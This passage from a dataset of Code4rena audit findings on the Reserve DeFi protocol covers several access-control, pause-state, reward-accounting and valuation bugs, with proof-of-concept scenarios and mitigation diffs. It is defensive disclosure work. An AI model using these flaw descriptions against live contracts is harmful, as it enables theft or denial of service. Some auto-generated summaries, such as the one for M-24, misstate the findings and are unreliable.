class=\"grvsc-source\"><span class=\"mtk7\">219</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">//   rsrAmount &lt;= 1e29, totalStaked &lt;= 1e38, 1e29 * 1e38 &lt; 2^256.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">220</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// stakeAmount: how many stRSR the user shall receive.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">221</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// pick stakeAmount as big as we can such that (newTotalStakes &lt;= newStakeRSR * stakeRate)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newStakeRSR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stakeRSR</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// newTotalStakes: {qStRSR} = D18{qStRSR/qRSR} * {qRSR} / D18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">224</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTotalStakes</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">stakeRate</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">newStakeRSR</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">FIX_ONE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newTotalStakes</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Update staked</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">stakeRSR</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Transfer RSR from account to this contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Staked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">era</span><span class=\"mtk1\">, </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">234</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// == Interactions ==</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">IERC20Upgradeable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rsr</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">237</span><span class=\"mtk1\">:    }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "#l-02-stake-function-shouldnt-be-accessible-when-the-status-is-paused-or-frozen",
      "tags": [],
      "finders": []
    },
    {
      "id": "16036",
      "title": "[L-01] Melt function should be only callable by the Furnance contract",
      "impact": "LOW",
      "content": "The function `melt` in RToken.sol is supposed to be called only by Furnace.sol, but as how it is right now the function can be called by anyone. This is problematic considering that this function burns tokens, if a user calls it by mistake. His tokens will be lost and he won't be able to get them back.\n\n```solidity\ncontracts/p1/RToken.sol\n\n569:  function melt(uint256 amtRToken) external notPausedOrFrozen {\n570:        _burn(_msgSender(), amtRToken);\n571:        emit Melted(amtRToken);\n572:        requireValidBUExchangeRate();\n573:    }\n```\n\nConsider applying a require statement in the function `melt` that the msg.sender is the furnance contract:\n\n```solidity\n569:  function melt(uint256 amtRToken) external notPausedOrFrozen {\n569:        require(_msgSender() == address(furnance), \"not furnance contract\");\n570:        _burn(_msgSender(), amtRToken);\n571:        emit Melted(amtRToken);\n572:        requireValidBUExchangeRate();\n573:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "#l-01-melt-function-should-be-only-callable-by-the-furnance-contract",
      "tags": [],
      "finders": []
    },
    {
      "id": "16035",
      "title": "[M-25] BackingManager: rTokens might not be redeemable when protocol is paused due to missing token allowance",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77>\n\nThe Reserve protocol allows redemption of rToken even when the protocol is `paused`.\n\nThe `docs/system-design.md` documentation describes the `paused` state as:\n\n> all interactions disabled EXCEPT RToken.redeem + RToken.cancel + ERC20 functions + StRSR.stake\n\nRedemption of rToken should only ever be prohibited when the protocol is in the `frozen` state.\n\nThe issue is that the `RToken.redeem` function (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514>) relies on the `BackingManager.grantRTokenAllowance` function (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77>) to be called before redemption.\n\nAlso the only function that relies on `BackingManager.grantRTokenAllowance` to be called before is `RToken.redeem`.\n\nTherefore `BackingManager.grantRTokenAllowance` can be called at any time before a specific ERC20 needs first be transferred from the `BackingManager` for the purpose of redemption of rToken.\n\nThe issue is that the `BackingManager.grantRTokenAllowance` function has the `notPausedOrFrozen` modifier. This means it cannot (in contrast to `RToken.redeem`) be called when the protocol is `paused`.\n\nTherefore if rToken is for the first time redeemed for a specific ERC20 in a `paused` protocol state, `BackingManager.grantRTokenAllowance` might not have been called before.\n\nThis effectively disables redemption of rToken as long as the protocol is `paused` and is clearly against the usability / economic considerations to allow redemption in the `paused` state.\n\n### Proof of Concept\n\nFor simplicity assume there is an rToken backed by a single ERC20 called AToken\n\n1.  rToken is issued and AToken is transferred to the `BackingManager`.\n2.  The protocol goes into the `paused` state before any redemptions have occurred. So the `BackingManager.grantRTokenAllowance` function might not have been called at this point.\n3.  Now the protocol is `paused` which should allow redemption of rToken but it is not possible because the AToken allowance cannot be granted since the `BackingManager.grantRTokenAllowance` function cannot be called in the `paused` state.\n\nAnother scenario is when the basket of a RToken is changed to include an ERC20 that was not included in the basket before. If the protocol now goes into the `paused` state without `BackingManager.grantRTokenAllowance` being called before, redemption is not possible.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThe `BackingManager.grantRTokenAllowance` function should use the `notFrozen` modifier instead of the `notPausedOrFrozen` modifier such that allowance can be granted in the `paused` state:\n\n    diff --git a/contracts/p1/BackingManager.sol b/contracts/p1/BackingManager.sol\n    index 431e0796..7dfa29e9 100644\n    --- a/contracts/p1/BackingManager.sol\n    +++ b/contracts/p1/BackingManager.sol\n    @@ -69,7 +69,7 @@ contract BackingManagerP1 is TradingP1, IBackingManager {\n         // checks: erc20 in assetRegistry\n         // action: set allowance on erc20 for rToken to UINT_MAX\n         // Using two safeApprove calls instead of safeIncreaseAllowance to support USDT\n    -    function grantRTokenAllowance(IERC20 erc20) external notPausedOrFrozen {\n    +    function grantRTokenAllowance(IERC20 erc20) external notFrozen {\n             require(assetRegistry.isRegistered(erc20), \"erc20 unregistered\");\n             // == Interaction ==\n             IERC20Upgradeable(address(erc20)).safeApprove(address(main.rToken()), 0);\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/16#issuecomment-1402019974):**\n > I think the warden does identify a possible state of the system that could be problematic, albeit highly unlikely to be realized. Leaving open for sponsor review. \n\n**[pmckelvy1 (Reserve) confirmed](https://github.com/code-423n4/2023-01-reserve-findings/issues/16#issuecomment-1404274024)**\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/16#issuecomment-1421621092):**\n > Addressed here: https://github.com/reserve-protocol/protocol/pull/584\n\n**Status:** Mitigation confirmed. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/2), [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/67), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/47).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Reserve protocol that allows redemption of rToken even when the protocol is in the `paused` state. The documentation states that in the `paused` state, all interactions are disabled except rToken redemption. However, the `RToken.redeem` function relies on the `BackingManager.grantRTokenAllowance` function to be called before redemption. The `BackingManager.grantRTokenAllowance` function has the `notPausedOrFrozen` modifier, which means it cannot be called when the protocol is `paused`. Therefore if rToken is for the first time redeemed for a specific ERC20 in a `paused` protocol state, `BackingManager.grantRTokenAllowance` might not have been called before, effectively disabling redemption of rToken as long as the protocol is `paused`.\n\nThe recommended mitigation step is to change the `BackingManager.grantRTokenAllowance` function to use the `notFrozen` modifier instead of the `notPausedOrFrozen` modifier, such that allowance can be granted in the `paused` state. This would ensure that the `BackingManager.grantRTokenAllowance` function is called before a specific ERC20 needs to be transferred from the `BackingManager` for the purpose of redemption of rToken.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/16",
      "tags": [],
      "finders": [
        "unforgiven",
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "16034",
      "title": "[M-24] BasketHandler: Users might not be able to redeem their rToken when protocol is paused due to refreshBasket function",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L448><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L183-L192>\n\nThe Reserve protocol allows redemption of rToken even when the protocol is `paused`.\n\nThe `docs/system-design.md` documentation describes the `paused` state as:\n\n> all interactions disabled EXCEPT RToken.redeem + RToken.cancel + ERC20 functions + StRSR.stake\n\nRedemption of rToken should only ever be prohibited when the protocol is in the `frozen` state.\n\nYou can see that the `RToken.redeem` function (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514>) has the `notFrozen` modifier so it can be called when the protocol is in the `paused` state.\n\nThe issue is that this function relies on the `BasketHandler.status()` to not be `DISABLED` (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L448>).\n\nThe `BasketHandler.refreshBasket` function (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L183-L192>) however, which must be called to get the basket out of the `DISABLED` state, cannot be called by any user when the protocol is paused.\n\nWhen the protocol is paused it can only be called by the governance (OWNER) address.\n\nSo in case the basket is `DISABLED` and the protocol is paused, it is the governance that must call `refreshBasket` to allow redemption of rToken.\n\nThis is dangerous because redemption of rToken should not rely on governance to perform any actions such that users can get out of the protocol when there is something wrong with the governance technically or if the governance behaves badly.\n\n### Proof of Concept\n\nThe `RToken.redeem` function has the `notFrozen` modifier so it can be called when the protocol is paused (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439>).\n\nThe `BasketHandler.refreshBasket` function can only be called by the governance when the protocol is paused:\n\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L186-L190>\n\n```solidity\nrequire(\n    main.hasRole(OWNER, _msgSender()) ||\n        (status() == CollateralStatus.DISABLED && !main.pausedOrFrozen()),\n    \"basket unrefreshable\"\n);\n```\n\nTherefore the situation exists where rToken redemption should be possible but it is blocked by the `BasketHandler.refreshBasket` function.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThe `BasketHandler.refreshBasket` function should be callable by anyone when the `status()` is `DISABLED` and the protocol is `paused`.\n\nSo the above `require` statement can be changed like this:\n\n    diff --git a/contracts/p1/BasketHandler.sol b/contracts/p1/BasketHandler.sol\n    index f74155b1..963e29de 100644\n    --- a/contracts/p1/BasketHandler.sol\n    +++ b/contracts/p1/BasketHandler.sol\n    @@ -185,7 +185,7 @@ contract BasketHandlerP1 is ComponentP1, IBasketHandler {\n     \n             require(\n                 main.hasRole(OWNER, _msgSender()) ||\n    -                (status() == CollateralStatus.DISABLED && !main.pausedOrFrozen()),\n    +                (status() == CollateralStatus.DISABLED && !main.frozen()),\n                 \"basket unrefreshable\"\n             );\n             _switchBasket();\n\nIt was discussed with the sponsor that they might even allow rToken redemption when the basket is `DISABLED`.\n\nIn other words only disallow it when the protocol is `frozen`.\n\nThis however needs further consideration by the sponsor as it might negatively affect other aspects of the protocol that are beyond the scope of this report.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/39#issuecomment-1401973403):**\n > I believe this to be a design choice. Will leave open to sponsor review and most likely downgrade to QA.\n\n**[pmckelvy1 (Reserve) acknowledged](https://github.com/code-423n4/2023-01-reserve-findings/issues/39#issuecomment-1406917946)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/39#issuecomment-1409516991):**\n > The warden identified a state that was inconsistent with sponsors expectations since they acknowledged the issue, I believe this should be Medium as it does affect the availability of the protocol. \n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR enables redemption while the basket is DISABLED: [reserve-protocol/protocol#575](https://github.com/reserve-protocol/protocol/pull/575)\n\n**Status:** Mitigation confirmed. Full details in reports from [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/66), [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/3), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/46).\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the Reserve Protocol, which is a platform that allows users to redeem rToken even when the protocol is paused. The protocol should only allow redemption of rToken when it is in the frozen state. The issue is that the RToken.redeem function can be called when the protocol is paused, but it relies on the BasketHandler.status() to not be disabled. The BasketHandler.refreshBasket function, which must be called to get the basket out of the disabled state, can only be called by the governance when the protocol is paused. This means that redemption of rToken relies on the governance to perform any actions such that users can get out of the protocol. \n\nThe proof of concept for this bug was found by examining the RToken.redeem function, which has the notFrozen modifier so it can be called when the protocol is paused. It was also found that the BasketHandler.refreshBasket function can only be called by the governance when the protocol is paused. This means that when the basket is disabled and the protocol is paused, it is the governance that must call refreshBasket to allow redemption of rToken.\n\nThe recommended mitigation steps for this bug are to change the BasketHandler.refreshBasket function so that it can be called by anyone when the status is disabled and the protocol is paused. Additionally, it was discussed with the sponsor that they might even allow rToken redemption when the basket is disabled, as long as the protocol is not frozen. However, this needs further consideration as it might negatively affect other aspects of the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/39",
      "tags": [],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "16033",
      "title": "[M-23] StRSR: seizeRSR function fails to update rsrRewardsAtLastPayout variable",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L374-L422><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530>\n\nIf a RToken is under-collateralized, the `BackingManager` can call the `StRSR.seizeRSR` function (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L141>).\n\nThis sends some amount of `rsr` held by the `StRSR` contract to the `BackingManager` which can then be traded for other tokens in order to recollateralize the RToken.\n\nThere are 3 pools of `rsr` in the `StRSR` contract that `StRSR.seizeRSR` claims `rsr` from.\n\n1.  `stakeRSR` (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L386-L398>)\n2.  `draftRSR` (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L401-L414>)\n3.  rewards (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L417>)\n\nThe `rsr` taken from the rewards is what is interesting in this report.\n\nThe issue is that the `StRSR._payoutRewards` function (which is used to pay `rsr` rewards to stakers over time) keeps track of the available rewards to distribute in the `rsrRewardsAtLastPayout` variable (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L517>).\n\nWhen the `StRSR.seizeRSR` function is called (taking away rewards and sending them to the `BackingManager`) and after that `StRSR._payoutRewards` is called, `StRSR._payoutRewards` uses the `rsrRewardsAtLastPayout` variable that was set before the seizure (the actual amount of rewards is smaller after the seizure).\n\nThereby the amount by which `StRSR.stakeRSR` is increased (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513>) when rewards are paid out can be greater than the actual rewards that are available.\n\n### Proof of Concept and further assessment of Impact\n\nThe fact that the `rsrRewardsAtLastPayout` variable is too big after a call to `StRSR.seizeRSR` has two consequences when `StRSR._payoutRewards` is called:\n\n1.  `stakeRSR` is increased by an amount that is larger than it should be (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513>)\n2.  `stakeRate` (which uses division by `stakeRSR` when calculated) is smaller than it should be (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L524-L526>)\n\nBoth affected variables can in principle be off by a large amount. In practice this is not likely because the rewards paid out will be small in comparison to `stakeRSR`.\n\nAlso after a second call to `StRSR._payoutRewards` all variables are in sync again and the problem has solved itself. The excess payouts are then accounted for by the `StRSR.rsrRewards` function.\n\nSo there is a small amount of time for any real issue to occur and there does not always occur an issue when `StRSR.seizeRSR` is called.\n\nThat being said, the behavior described so far can cause a temporary DOS:\n\nIn `StRSR._payoutRewards`, `stakeRSR` is increased (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513>), then `StRSR.rsrRewards` is called which calculates `rsr.balanceOf(address(this)) - stakeRSR - draftRSR` (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598>).\n\nThe falsely paid out amount of rewards can increase `StRSR.stakeRSR` so much that this line reverts due to underflow.\n\nThis can cause DOS when `StRSR.seizeRSR` is called again because it internally calls `StRSR.rsrRewards`.\n\nThis will solve itself when more `rsr` accumulates in the contract due to revenue which makes the balance increase or someone can just send `rsr` and thereby increase the balance.\n\nThe DOS occurs also in all functions that internally call `StRSR._payoutRewards` (`StRSR.stake` and `StRSR.unstake`):\n\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215>\n\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L262>\n\nOverall the impact of this on the average RToken is quite limited but as explained above it can definitely cause issues.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen `StRSR.seizeRSR` is called, the `rsrRewardsAtLastPayout` variable should be set to the rewards that are available after the seizure:\n\n    diff --git a/contracts/p1/StRSR.sol b/contracts/p1/StRSR.sol\n    index 8fe1c3e7..4f9ea736 100644\n    --- a/contracts/p1/StRSR.sol\n    +++ b/contracts/p1/StRSR.sol\n    @@ -419,6 +419,7 @@ abstract contract StRSRP1 is Initializable, ComponentP1, IStRSR, EIP712Upgradeab\n             // Transfer RSR to caller\n             emit ExchangeRateSet(initRate, exchangeRate());\n             IERC20Upgradeable(address(rsr)).safeTransfer(_msgSender(), seizedRSR);\n    +        rsrRewardsAtLastPayout = rsrRewards();\n         }\n\n**[pmckelvy1 (Reserve) confirmed](https://github.com/code-423n4/2023-01-reserve-findings/issues/64#issuecomment-1406912384)**\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/64#issuecomment-1421619875):**\n > Addressed here: https://github.com/reserve-protocol/protocol/pull/584\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/65), [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/4), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/45).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a protocol called Reserve Protocol. The protocol is used to manage a token called RToken, which is a type of cryptocurrency. The vulnerability is related to the function StRSR.seizeRSR, which is used to take away rewards and send them to the BackingManager. This function can cause an issue when the StRSR._payoutRewards function is called, as the amount of rewards paid out is larger than the actual rewards available. This can lead to an increase in the StRSR.stakeRSR variable, as well as a decrease in the StRSR.stakeRate variable. This can in turn lead to a temporary denial of service (DOS) issue.\n\nTo fix this issue, the rsrRewardsAtLastPayout variable should be set to the rewards that are available after the seizure. This will ensure that the amount of rewards paid out is correctly accounted for.\n\nOverall, the impact of this vulnerability on the average RToken is quite limited, but it can cause issues. To mitigate the issue, the code should be updated with the recommended mitigation steps.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/64",
      "tags": [],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "16032",
      "title": "[M-22] RecollateralizationLib: Dust loss for an asset should be capped at it’s low value",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275\n\n\n## Vulnerability details\n\n## Impact\nThe `RecollateralizationLib.basketRange` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202)) internally calls the `RecollateralizationLib.totalAssetValue` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L226-L281](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L226-L281)).  \n\nI will show in this report that the `RecollateralizationLib.totalAssetValue` function returns a value for `assetsLow` that is too low.  \n\nThis in turn causes the `range.bottom` value ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L201](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L201)) that the `RecollateralizationLib.basketRange` function returns to be too low.  \n\nBefore showing why the `assetsLow` value is underestimated however I will explain the impact of the `range.bottom` variable being too low.  \n\nThere are two places where this value is used:  \n\n### 1. `RecollateralizationLib.prepareRecollateralizationTrade` function \nThis function passes the `range` to the `RecollateralizationLib.nextTradePair` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L88-L91](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L88-L91))\n\nSince `range.bottom` is too low, the `needed` amount is too low ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L380](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L380)).  \n\nThis causes the `if` statement to not be executed in some cases when it otherwise would be executed ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L381-L396](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L381-L396)).  \n\nAnd the `amtShort` is smaller than it should be ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L391](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L391)).  \n\nIn the end this causes recollateralization trades to not buy as much assets as they could buy. This is because the amount of assets is underestimated so the protocol can actually hold more baskets than it thinks it can.  \n\nTherefore underestimating `assetsLow` causes a direct loss to RToken holders because the protocol will not recollateralize the RToken to the level that it can and should.  \n\n### 2. Price calculations of `RTokenAsset`\nA `RTokenAsset` uses the `RecollateralizationLib.basketRange` function to calculate its value:  \n\n[https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L156](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L156)  \n\nThe `RTokenAsset` therefore underestimates its `low` and `lotLow` prices:  \n\n[https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L58](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L58)  